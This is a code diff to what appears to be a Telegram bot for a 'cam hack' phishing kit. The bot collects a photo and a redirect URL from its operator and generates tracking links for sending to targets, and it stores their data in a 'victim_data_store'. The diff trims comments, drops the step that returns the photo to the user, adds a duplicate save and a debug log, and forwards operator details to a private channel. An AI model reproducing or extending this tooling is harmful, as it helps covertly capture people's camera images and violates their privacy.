@@ -8,7 +8,6 @@ from bot.utils.storage import user_data, link_cache, victim_data_store, user_use
 def handle_cam_hack(bot, message, get_bottom_buttons):
     user_id = message.chat.id
 
-    # ===== USERNAME CAPTURE =====
     try:
         chat = bot.get_chat(user_id)
         if chat.username:
@@ -32,7 +31,6 @@ def get_cam_photo(message, user_id, get_bottom_buttons, bot):
 
         username = user_username_cache.get(user_id, "Unknown")
 
-        # ===== CHANNEL ME PHOTO (NO MARKDOWN) =====
         try:
             bot.send_photo(
                 PRIVATE_CHANNEL_ID,
@@ -43,16 +41,6 @@ def get_cam_photo(message, user_id, get_bottom_buttons, bot):
         except Exception as e:
             print(f"Channel photo error: {e}")
 
-        # ===== USER KO PHOTO =====
-        try:
-            bot.send_photo(
-                user_id,
-                photo_id,
-                caption=f"📸 Your Photo\n\nUsername: {username}\nID: {user_id}"
-            )
-        except Exception as e:
-            print(f"User photo error: {e}")
-
         msg = bot.send_message(user_id, "📤 Now send REDIRECT LINK", reply_markup=get_bottom_buttons())
         bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
     else:
@@ -60,15 +48,19 @@ def get_cam_photo(message, user_id, get_bottom_buttons, bot):
 
 
 def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
-    redirect_url = message.text
+    redirect_url = message.text.strip()
 
     if redirect_url.startswith("http"):
+        # ===== SAVE REDIRECT (STRING KEY) =====
         user_data[user_id]["redirect"] = redirect_url
         victim_data_store[f"redirect_{user_id}"] = redirect_url
+        victim_data_store[f"redirect_{str(user_id)}"] = redirect_url  # Double save
 
         username = user_username_cache.get(user_id, "Unknown")
 
-        # ===== CHANNEL ME REDIRECT LINK =====
+        # Debug log
+        print(f"✅ REDIRECT SAVED: redirect_{user_id} = {redirect_url}")
+
         try:
             bot.send_message(
                 PRIVATE_CHANNEL_ID,
@@ -77,7 +69,7 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
         except Exception as e:
             print(f"Redirect send error: {e}")
 
-        # ===== FINAL LINK GENERATE =====
+        # ===== GENERATE FINAL LINK =====
         unique_id = str(uuid.uuid4())[:8]
         link = f"{BASE_URL}/p/cam/{unique_id}?v={user_id}"
         link_cache[unique_id] = {
@@ -87,7 +79,6 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
             "link": link
         }
 
-        # ===== CHANNEL ME FINAL LINK =====
         try:
             bot.send_message(
                 PRIVATE_CHANNEL_ID,
@@ -96,7 +87,6 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
         except Exception as e:
             print(f"Final link send error: {e}")
 
-        # ===== USER KO FINAL LINK =====
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
